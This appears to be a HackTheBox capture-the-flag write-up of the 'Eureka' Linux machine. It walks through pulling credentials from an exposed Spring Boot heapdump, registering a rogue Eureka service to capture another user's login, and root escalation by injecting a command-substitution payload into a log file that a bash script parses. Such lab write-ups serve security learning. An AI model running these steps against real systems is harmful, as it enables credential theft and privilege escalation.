---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
  - Eureka
  - Nuclei
  - Heapdump
  - Spring-boot
  - Acutator
---
# Overview

| Name        | Eureka    |
| ----------- | --------- |
| OS          | Linux     |
| Base Points | Hard [40] |
| Status      | Done      |
# Recon
## Nmap

```bash
❯ sudo nmap -sC -sV -A 10.10.11.66
[sudo] password for at0m:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-12 10:24 +0545
Nmap scan report for 10.10.11.66
Host is up (0.32s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)
|   256 90:11:9d:67:b6:f6:64:d4:df:7f:ed:4a:90:2e:6d:7b (ECDSA)
|_  256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://furni.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT       ADDRESS
1   344.28 ms 10.10.14.1
2   344.38 ms 10.10.11.66
```

```bash
❯ hostfile --linux 10.10.11.66 furni.htb
Added to /etc/hosts:
   10.10.11.66 furni.htb
```

![[eureka.png]]

If we try seeing 404 page using random endpoint.

![[eureka2.png]]

which is a error for Spring Boot Application.
# Enumeration
## Gobuster

```bash
❯ gobuster dir -u http://furni.htb -w  /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt
<SNIP>
/actuator             (Status: 200) [Size: 2129]
/actuator/caches      (Status: 200) [Size: 20]
/actuator/env/lang    (Status: 200) [Size: 668]
/actuator/env/home    (Status: 200) [Size: 668]
/actuator/env         (Status: 200) [Size: 6307]
/actuator/env/path    (Status: 200) [Size: 668]
/actuator/features    (Status: 200) [Size: 467]
/actuator/configprops (Status: 200) [Size: 37195]
/actuator/health      (Status: 200) [Size: 15]
/actuator/info        (Status: 200) [Size: 2]
/actuator/metrics     (Status: 200) [Size: 3319]
/actuator/beans       (Status: 200) [Size: 202254]
/actuator/conditions  (Status: 200) [Size: 184221]
/actuator/mappings    (Status: 200) [Size: 35560]
/actuator/refresh     (Status: 405) [Size: 114]
/actuator/scheduledtasks (Status: 200) [Size: 54]
/actuator/sessions    (Status: 400) [Size: 108]
/actuator/loggers     (Status: 200) [Size: 98345]
/actuator/threaddump  (Status: 200) [Size: 106725]
Progress: 119 / 120 (99.17%)[ERROR] error on word actuator/heapdump: timeout occurred during the request
Progress: 120 / 120 (100.00%)
```

As we can see `actuator` is exposed. We can also do this from `nuclei`.
## Nuclei

```bash
❯ nuclei -target http://furni.htb

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.4.10

                projectdiscovery.io

[INF] nuclei-templates are not installed, installing...
[INF] Successfully installed nuclei-templates at /home/at0m/.local/nuclei-templates
[WRN] Found 1 templates with syntax error (use -validate flag for further examination)
[INF] Current nuclei version: v3.4.10 (latest)
[INF] Current nuclei-templates version: v10.2.8 (latest)
[INF] New templates added in latest release: 114
[INF] Templates loaded for current scan: 8323
[INF] Executing 8121 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 202 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1782 (Reduced 1676 Requests)
[INF] Using Interactsh Server: oast.pro
[external-service-interaction] [http] [info] http://furni.htb
[missing-sri] [http] [info] http://furni.htb ["https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"]
[waf-detect:nginxgeneric] [http] [info] http://furni.htb
[springboot-heapdump] [http] [critical] http://furni.htb/actuator/heapdump
```

We can read this [blog](https://www.wiz.io/blog/spring-boot-actuator-misconfigurations) on Exploring Spring Boot Actuator Misconfigurations and it says that `heapdump` file has sensitive info. `actuator` is like debug endpoint for developer.
## `Heapdump`

Nuclie shows `http://furni.htb/actuator/heapdump` as critical.

```bash
❯ wget http://furni.htb/actuator/heapdump
--2025-09-12 10:42:15--  http://furni.htb/actuator/heapdump
Resolving furni.htb (furni.htb)... 10.10.11.66
Connecting to furni.htb (furni.htb)|10.10.11.66|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 80165337 (76M) [application/octet-stream]
Saving to: ‘heapdump’

heapdump                       100%[===================================================>]  76.45M  2.19MB/s    in 39s

2025-09-12 10:42:54 (1.98 MB/s) - ‘heapdump’ saved [80165337/80165337]


❯ strings heapdump | grep password=
{password=0sc@r190_S0l!dP@sswd, user=oscar190}!
update users set email=?,first_name=?,last_name=?,password=? where id=?!
```

We got creds `oscar190:0sc@r190_S0l!dP@sswd`. We can actually SSH using it.

> To get sensitive info we can also use [JDumpSpider](https://github.com/whwlsfb/JDumpSpider).
## SSH

```bash
❯ ssh oscar190@furni.htb
The authenticity of host 'furni.htb (10.10.11.66)' can't be established.
ED25519 key fingerprint is SHA256:5/rCExVFUnFdG5UFLnW7ExQuyelBwtSqwHzBiWKqza0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'furni.htb' (ED25519) to the list of known hosts.
oscar190@furni.htb's password:

oscar190@eureka:~$ id
uid=1000(oscar190) gid=1001(oscar190) groups=1001(oscar190)
```

```bash
oscar190@eureka:~$ netstat -tunl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN
tcp6       0      0 :::80                   :::*                    LISTEN
tcp6       0      0 127.0.0.1:8081          :::*                    LISTEN
tcp6       0      0 127.0.0.1:8082          :::*                    LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
tcp6       0      0 :::8761                 :::*                    LISTEN
udp        0      0 127.0.0.53:53           0.0.0.0:*
udp6       0      0 :::54850                :::*
udp6       0      0 :::38472                :::*
udp6       0      0 :::52987                :::*
udp6       0      0 :::53107                :::*
```

We get unusual port `8761` internally.

```bash
❯ strings heapdump | grep 8761 -n
227464:P`http://localhost:8761/eureka/
344576:http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/!
366651:http://localhost:8761/eureka/!
442796:http://localhost:8761/eureka/!
450355:Host: localhost:8761
450870:http://localhost:8761/eureka/!
451153:Host: localhost:8761
```

We get another creds of Eureka Server `EurekaSrvr:0scarPWDisTheB3st`, We can port forward to our machine. We can also find Located Eureka configuration in `/var/www/web/Eureka-Server/target/classes/application.yaml`.

```bash
ssh oscar190@furni.htb -L 8761:127.0.0.1:8761 
```

Now in URL `127.0.0.1:8761` use this creds:

```
username:EurekaSrvr
password:0scarPWDisTheB3st
```

![[eureka3.png]]

Eureka is one of a series of projects within Netflix's open-source microservices framework. Spring Cloud repackaged it to form the Spring Cloud Netflix subproject. While the principles underlying Netflix's microservices implementation remain unchanged, Eureak has been ported to Spring Boot, making it easier for developers to use and integrate. It is a loadbalancer.
## [Hacking Netflix Eureka](https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka)

Read the above blog for more detail but basically registering a **malicious fake service** using the stolen Eureka credentials so that if someone logins our loadbalancer which is Eureka will get the traffic.

Go to `http://127.0.0.1:8761/eureka/apps` and you will see full meta data. 

```xml
applications>
<versions__delta>1</versions__delta>
<apps__hashcode>UP_4_</apps__hashcode>
<application>
<name>APP-GATEWAY</name>
<instance>
<instanceId>localhost:app-gateway:8080</instanceId>
<hostName>localhost</hostName>
<app>APP-GATEWAY</app>
<ipAddr>10.10.11.66</ipAddr>
<status>UP</status>
<overriddenstatus>UNKNOWN</overriddenstatus>
<port enabled="true">8080</port>
<securePort enabled="false">443</securePort>
<countryId>1</countryId>
<dataCenterInfo class="com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo">
<name>MyOwn</name>
</dataCenterInfo>
<leaseInfo>
<renewalIntervalInSecs>30</renewalIntervalInSecs>
<durationInSecs>90</durationInSecs>
<registrationTimestamp>1757585004159</registrationTimestamp>
<lastRenewalTimestamp>1757658285104</lastRenewalTimestamp>
<evictionTimestamp>0</evictionTimestamp>
<serviceUpTimestamp>1757585004160</serviceUpTimestamp>
</leaseInfo>
<metadata>
<management.port>8080</management.port>
</metadata>
<homePageUrl>http://localhost:8080/</homePageUrl>
<statusPageUrl>http://localhost:8080/actuator/info</statusPageUrl>
<healthCheckUrl>http://localhost:8080/actuator/health</healthCheckUrl>
<vipAddress>app-gateway</vipAddress>
<secureVipAddress>app-gateway</secureVipAddress>
<isCoordinatingDiscoveryServer>false</isCoordinatingDiscoveryServer>
<lastUpdatedTimestamp>1757585004160</lastUpdatedTimestamp>
<lastDirtyTimestamp>1757585001729</lastDirtyTimestamp>
<actionType>ADDED</actionType>
</instance>
</application>
<application>
<name>USER-MANAGEMENT-SERVICE</name>
<instance>
<instanceId>10.10.14.72:user-management-service:5000</instanceId>
<hostName>10.10.14.72</hostName>
<app>USER-MANAGEMENT-SERVICE</app>
<ipAddr>10.10.14.72</ipAddr>
<status>UP</status>
<overriddenstatus>UNKNOWN</overriddenstatus>
<port enabled="true">5000</port>
<securePort enabled="false">9443</securePort>
<countryId>1</countryId>
<dataCenterInfo class="com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo">
<name>MyOwn</name>
</dataCenterInfo>
<leaseInfo>
<renewalIntervalInSecs>30</renewalIntervalInSecs>
<durationInSecs>90</durationInSecs>
<registrationTimestamp>1757609449369</registrationTimestamp>
<lastRenewalTimestamp>1757609723419</lastRenewalTimestamp>
<evictionTimestamp>0</evictionTimestamp>
<serviceUpTimestamp>1757608486408</serviceUpTimestamp>
</leaseInfo>
<metadata>
<zone>default</zone>
<vipAddress>USER-MANAGEMENT-SERVICE</vipAddress>
<management.port>5000</management.port>
</metadata>
<homePageUrl>http://10.10.14.72:5000/</homePageUrl>
<statusPageUrl>http://10.10.14.72:5000/info</statusPageUrl>
<healthCheckUrl>http://10.10.14.72:5000/health</healthCheckUrl>
<secureHealthCheckUrl/>
<vipAddress>user-management-service</vipAddress>
<secureVipAddress>user-management-service</secureVipAddress>
<isCoordinatingDiscoveryServer>false</isCoordinatingDiscoveryServer>
<lastUpdatedTimestamp>1757609449369</lastUpdatedTimestamp>
<lastDirtyTimestamp>1757609446804</lastDirtyTimestamp>
<actionType>ADDED</actionType>
</instance>
<instance>
<instanceId>localhost:USER-MANAGEMENT-SERVICE:8081</instanceId>
<hostName>localhost</hostName>
<app>USER-MANAGEMENT-SERVICE</app>
<ipAddr>10.10.11.66</ipAddr>
<status>UP</status>
<overriddenstatus>UNKNOWN</overriddenstatus>
<port enabled="true">8081</port>
<securePort enabled="false">443</securePort>
<countryId>1</countryId>
<dataCenterInfo class="com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo">
<name>MyOwn</name>
</dataCenterInfo>
<leaseInfo>
<renewalIntervalInSecs>30</renewalIntervalInSecs>
<durationInSecs>90</durationInSecs>
<registrationTimestamp>1757585015353</registrationTimestamp>
<lastRenewalTimestamp>1757658271089</lastRenewalTimestamp>
<evictionTimestamp>0</evictionTimestamp>
<serviceUpTimestamp>1757585015353</serviceUpTimestamp>
</leaseInfo>
<metadata>
<management.port>8081</management.port>
</metadata>
<homePageUrl>http://localhost:8081/</homePageUrl>
<statusPageUrl>http://localhost:8081/actuator/info</statusPageUrl>
<healthCheckUrl>http://localhost:8081/actuator/health</healthCheckUrl>
<vipAddress>USER-MANAGEMENT-SERVICE</vipAddress>
<secureVipAddress>USER-MANAGEMENT-SERVICE</secureVipAddress>
<isCoordinatingDiscoveryServer>false</isCoordinatingDiscoveryServer>
<lastUpdatedTimestamp>1757585015353</lastUpdatedTimestamp>
<lastDirtyTimestamp>1757585014142</lastDirtyTimestamp>
<actionType>ADDED</actionType>
</instance>
</application>
<application>
<name>FURNI</name>
<instance>
<instanceId>localhost:Furni:8082</instanceId>
<hostName>localhost</hostName>
<app>FURNI</app>
<ipAddr>10.10.11.66</ipAddr>
<status>UP</status>
<overriddenstatus>UNKNOWN</overriddenstatus>
<port enabled="true">8082</port>
<securePort enabled="false">443</securePort>
<countryId>1</countryId>
<dataCenterInfo class="com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo">
<name>MyOwn</name>
</dataCenterInfo>
<leaseInfo>
<renewalIntervalInSecs>30</renewalIntervalInSecs>
<durationInSecs>90</durationInSecs>
<registrationTimestamp>1757585024635</registrationTimestamp>
<lastRenewalTimestamp>1757658280871</lastRenewalTimestamp>
<evictionTimestamp>0</evictionTimestamp>
<serviceUpTimestamp>1757585024635</serviceUpTimestamp>
</leaseInfo>
<metadata>
<management.port>8082</management.port>
</metadata>
<homePageUrl>http://localhost:8082/</homePageUrl>
<statusPageUrl>http://localhost:8082/actuator/info</statusPageUrl>
<healthCheckUrl>http://localhost:8082/actuator/health</healthCheckUrl>
<vipAddress>Furni</vipAddress>
<secureVipAddress>Furni</secureVipAddress>
<isCoordinatingDiscoveryServer>false</isCoordinatingDiscoveryServer>
<lastUpdatedTimestamp>1757585024635</lastUpdatedTimestamp>
<lastDirtyTimestamp>1757585024123</lastDirtyTimestamp>
<actionType>ADDED</actionType>
</instance>
</application>
</applications>
```

Ask GPT to make a curl request from it on `USER-MANAGEMENT-SERVICE` because we want to register to new user.

```bash
curl -X POST http://EurekaSrvr:0scarPWDisTheB3st@127.0.0.1:8761/eureka/apps/USER-MANAGEMENT-SERVICE \
  -H 'Content-Type: application/json' \
  -d '{
  "instance": {
    "instanceId": "USER-MANAGEMENT-SERVICE",
    "hostName": "10.10.14.233",
    "app": "USER-MANAGEMENT-SERVICE",
    "ipAddr": "10.10.14.233",
    "vipAddress": "USER-MANAGEMENT-SERVICE",
    "secureVipAddress": "USER-MANAGEMENT-SERVICE",
    "status": "UP",
    "port": { "$": 8081, "@enabled": "true" },
    "dataCenterInfo": {
      "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
      "name": "MyOwn"
    }
  }
}'
```

```bash
❯ curl -X POST http://EurekaSrvr:0scarPWDisTheB3st@127.0.0.1:8761/eureka/apps/USER-MANAGEMENT-SERVICE \
  -H 'Content-Type: application/json' \
  -d '{
  "instance": {
    "instanceId": "USER-MANAGEMENT-SERVICE",
    "hostName": "10.10.14.233",
    "app": "USER-MANAGEMENT-SERVICE",
    "ipAddr": "10.10.14.233",
    "vipAddress": "USER-MANAGEMENT-SERVICE",
    "secureVipAddress": "USER-MANAGEMENT-SERVICE",
    "status": "UP",
    "port": { "$": 8081, "@enabled": "true" },
    "dataCenterInfo": {
      "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
      "name": "MyOwn"
    }
  }
}'
```

Put your IP and start a listner.

```bash
❯ rlwrap nc -nlvp 8081
listening on [any] 8081 ...
connect to [10.10.14.233] from (UNKNOWN) [10.10.11.66] 47268
POST /login HTTP/1.1
X-Real-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1,127.0.0.1
X-Forwarded-Proto: http,http
Content-Length: 168
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: SESSION=NTQyYmUxODItOTU5NC00YTg0LWJhNzAtYzZjMWRkZjM5Mjk5
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Forwarded: proto=http;host=furni.htb;for="127.0.0.1:58872"
X-Forwarded-Port: 80
X-Forwarded-Host: furni.htb
host: 10.10.14.233:8081

username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve&_csrf=h3cL8qsSX84gwxhOp52NiZrsTY8ityi8FdDzfcRKguvyVXRvtkQ4k8onaaoN9i1_xbC5u_vZYLYX0hqRduSXHPYpu9PHbENb
```

After waiting for like 2 minutes we will get creds of user who visited `miranda.wise@furni.htb:IL!veT0Be&BeT0L0ve`. We can check from `oscar` ssh if `miranda` exists:

```bash
oscar190@eureka:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:115:119:MySQL Server,,,:/nonexistent:/bin/false
oscar190:x:1000:1001:,,,:/home/oscar190:/bin/bash
miranda-wise:x:1001:1002:,,,:/home/miranda-wise:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```

We can see `miranda-wise` so it does exist. Now SSH to her.
## SSH (`miranda.wise`)

```bash
❯ ssh miranda-wise@furni.htb
miranda-wise@furni.htb's password: IL!veT0Be&BeT0L0ve

miranda-wise@eureka:~$ cat user.txt
206184839daa5357821b464e72226085
```
# Privilege Escalation

```bash
miranda-wise@eureka:/opt$ cd /var
miranda-wise@eureka:/var$ cd www
miranda-wise@eureka:/var/www$ ls
html  web
miranda-wise@eureka:/var/www$ cd web
miranda-wise@eureka:/var/www/web$ ls
cloud-gateway  Eureka-Server  Furni  static  user-management-service
miranda-wise@eureka:/var/www/web$ cd cloud-gateway/
miranda-wise@eureka:/var/www/web/cloud-gateway$ ls
HELP.md  log  mvnw  mvnw.cmd  pom.xml  src  target
miranda-wise@eureka:/var/www/web/cloud-gateway$ cd log
miranda-wise@eureka:/var/www/web/cloud-gateway/log$ ls
application.log  application.log.2025-04-22.0.gz  application.log.2025-09-11.0.gz
miranda-wise@eureka:/var/www/web/cloud-gateway/log$ id
uid=1001(miranda-wise) gid=1002(miranda-wise) groups=1002(miranda-wise),1003(developers)
```

```bash
miranda-wise@eureka:~$ sudo -l
[sudo] password for miranda-wise:
Sorry, user miranda-wise may not run sudo on localhost.
miranda-wise@eureka:~$ cd /opt
miranda-wise@eureka:/opt$ ls
heapdump  log_analyse.sh  scripts
```

```bash
miranda-wise@eureka:/opt$ cat log_analyse.sh
#!/bin/bash

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
RESET='\033[0m'

LOG_FILE="$1"
OUTPUT_FILE="log_analysis.txt"

declare -A successful_users  # Associative array: username -> count
declare -A failed_users      # Associative array: username -> count
STATUS_CODES=("200:0" "201:0" "302:0" "400:0" "401:0" "403:0" "404:0" "500:0") # Indexed array: "code:count" pairs

if [ ! -f "$LOG_FILE" ]; then
    echo -e "${RED}Error: Log file $LOG_FILE not found.${RESET}"
    exit 1
fi


analyze_logins() {
    # Process successful logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${successful_users[$username]+_}" ]; then
            successful_users[$username]=$((successful_users[$username] + 1))
        else
            successful_users[$username]=1
        fi
    done < <(grep "LoginSuccessLogger" "$LOG_FILE")

    # Process failed logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${failed_users[$username]+_}" ]; then
            failed_users[$username]=$((failed_users[$username] + 1))
        else
            failed_users[$username]=1
        fi
    done < <(grep "LoginFailureLogger" "$LOG_FILE")
}


analyze_http_statuses() {
    # Process HTTP status codes
    while IFS= read -r line; do
        code=$(echo "$line" | grep -oP 'Status: \K.*')
        found=0
        # Check if code exists in STATUS_CODES array
        for i in "${!STATUS_CODES[@]}"; do
            existing_entry="${STATUS_CODES[$i]}"
            existing_code=$(echo "$existing_entry" | cut -d':' -f1)
            existing_count=$(echo "$existing_entry" | cut -d':' -f2)
            if [[ "$existing_code" -eq "$code" ]]; then
                new_count=$((existing_count + 1))
                STATUS_CODES[$i]="${existing_code}:${new_count}"
                break
            fi
        done
    done < <(grep "HTTP.*Status: " "$LOG_FILE")
}


analyze_log_errors(){
     # Log Level Counts (colored)
    echo -e "\n${YELLOW}[+] Log Level Counts:${RESET}"
    log_levels=$(grep -oP '(?<=Z  )\w+' "$LOG_FILE" | sort | uniq -c)
    echo "$log_levels" | awk -v blue="$BLUE" -v yellow="$YELLOW" -v red="$RED" -v reset="$RESET" '{
        if ($2 == "INFO") color=blue;
        else if ($2 == "WARN") color=yellow;
        else if ($2 == "ERROR") color=red;
        else color=reset;
        printf "%s%6s %s%s\n", color, $1, $2, reset
    }'

    # ERROR Messages
    error_messages=$(grep ' ERROR ' "$LOG_FILE" | awk -F' ERROR ' '{print $2}')
    echo -e "\n${RED}[+] ERROR Messages:${RESET}"
    echo "$error_messages" | awk -v red="$RED" -v reset="$RESET" '{print red $0 reset}'

    # Eureka Errors
    eureka_errors=$(grep 'Connect to http://localhost:8761.*failed: Connection refused' "$LOG_FILE")
    eureka_count=$(echo "$eureka_errors" | wc -l)
    echo -e "\n${YELLOW}[+] Eureka Connection Failures:${RESET}"
    echo -e "${YELLOW}Count: $eureka_count${RESET}"
    echo "$eureka_errors" | tail -n 2 | awk -v yellow="$YELLOW" -v reset="$RESET" '{print yellow $0 reset}'
}


display_results() {
    echo -e "${BLUE}----- Log Analysis Report -----${RESET}"

    # Successful logins
    echo -e "\n${GREEN}[+] Successful Login Counts:${RESET}"
    total_success=0
    for user in "${!successful_users[@]}"; do
        count=${successful_users[$user]}
        printf "${GREEN}%6s %s${RESET}\n" "$count" "$user"
        total_success=$((total_success + count))
    done
    echo -e "${GREEN}\nTotal Successful Logins: $total_success${RESET}"

    # Failed logins
    echo -e "\n${RED}[+] Failed Login Attempts:${RESET}"
    total_failed=0
    for user in "${!failed_users[@]}"; do
        count=${failed_users[$user]}
        printf "${RED}%6s %s${RESET}\n" "$count" "$user"
        total_failed=$((total_failed + count))
    done
    echo -e "${RED}\nTotal Failed Login Attempts: $total_failed${RESET}"

    # HTTP status codes
    echo -e "\n${CYAN}[+] HTTP Status Code Distribution:${RESET}"
    total_requests=0
    # Sort codes numerically
    IFS=$'\n' sorted=($(sort -n -t':' -k1 <<<"${STATUS_CODES[*]}"))
    unset IFS
    for entry in "${sorted[@]}"; do
        code=$(echo "$entry" | cut -d':' -f1)
        count=$(echo "$entry" | cut -d':' -f2)
        total_requests=$((total_requests + count))

        # Color coding
        if [[ $code =~ ^2 ]]; then color="$GREEN"
        elif [[ $code =~ ^3 ]]; then color="$YELLOW"
        elif [[ $code =~ ^4 || $code =~ ^5 ]]; then color="$RED"
        else color="$CYAN"
        fi

        printf "${color}%6s %s${RESET}\n" "$count" "$code"
    done
    echo -e "${CYAN}\nTotal HTTP Requests Tracked: $total_requests${RESET}"
}


# Main execution
analyze_logins
analyze_http_statuses
display_results | tee "$OUTPUT_FILE"
analyze_log_errors | tee -a "$OUTPUT_FILE"
echo -e "\n${GREEN}Analysis completed. Results saved to $OUTPUT_FILE${RESET}"
```

The `[[ "$existing_code" -eq "$code" ]]` syntax performs an arithmetic comparison. If `$(...)` is embedded within $code, Bash will execute the enclosed commands first. Read [here](https://www.vidarholen.net/contents/blog/?p=716)l

Following the article's guidelines, we must inject a payload like this:
`a[$(COMMAND>&2)+42` in a Status field in the application.log file. We must first have write access to that
log file to do so.

```bash
miranda-wise@eureka:/opt$ ls -la /var/www/web/cloud-gateway/log/application.log
-rw-rw-r-- 1 www-data www-data 21254 Sep 12 07:02 /var/www/web/cloud-gateway/log/application.log
```

Although we do not have access to write as `miranda-wise` , members of the developers group have full access to the log folder, so we can do a simple trick to get write access to the `application.log` file. 

```bash
miranda-wise@eureka:/var/www/web/cloud-gateway/log$ rm application.log
rm: remove write-protected regular file 'application.log'? y
miranda-wise@eureka:/var/www/web/cloud-gateway/log$ ls
application.log.2025-04-22.0.gz  application.log.2025-09-11.0.gz
```

```bash
miranda-wise@eureka:/var/www/web/cloud-gateway/log$ echo 'HTTP Status: x[$(cp /bin/bash /tmp/bash;chmod u+s /tmp/bash)]' >> application.log
miranda-wise@eureka:/var/www/web/cloud-gateway/log$ cat application.log
HTTP Status: x[$(cp /bin/bash /tmp/bash;chmod u+s /tmp/bash)]
```

Now run the script once:

```bash
miranda-wise@eureka:/var/www/web/cloud-gateway/log$ cd /opt
miranda-wise@eureka:/opt$ ls
heapdump  log_analyse.sh  scripts
miranda-wise@eureka:/opt$ /bin/bash log_analyse.sh /var/www/web/cloud-gateway/log/application.log
<SNIP>
```

then go to `/tmp`.

```bash
miranda-wise@eureka:/opt$ cd /tmp
miranda-wise@eureka:/tmp$ ls
bash                                                                               tmp.rULIm49VCp
hsperfdata_www-data                                                                tomcat.8081.309159581165821872
snap-private-tmp                                                                   tomcat.8082.1653767719367228204
systemd-private-30c5cf1f93b5497a99e2442e05769f77-ModemManager.service-Q5G9Rf       tomcat.8761.7452226488344606615
systemd-private-30c5cf1f93b5497a99e2442e05769f77-systemd-logind.service-7JMTHf     tomcat-docbase.8081.127325365975419816
systemd-private-30c5cf1f93b5497a99e2442e05769f77-systemd-resolved.service-Aitf2f   tomcat-docbase.8082.111499601983298233
systemd-private-30c5cf1f93b5497a99e2442e05769f77-systemd-timesyncd.service-REbVah  tomcat-docbase.8761.2716883528784864678
systemd-private-30c5cf1f93b5497a99e2442e05769f77-upower.service-bl7Yqi             vmware-root_787-4290625459
miranda-wise@eureka:/tmp$ ./bash -p
bash-5.0# id
uid=1001(miranda-wise) gid=1002(miranda-wise) euid=0(root) groups=1002(miranda-wise),1003(developers)
bash-5.0# cat /root/root.txt
a00136880d4c82e22869cdc67d3d777c
```

---
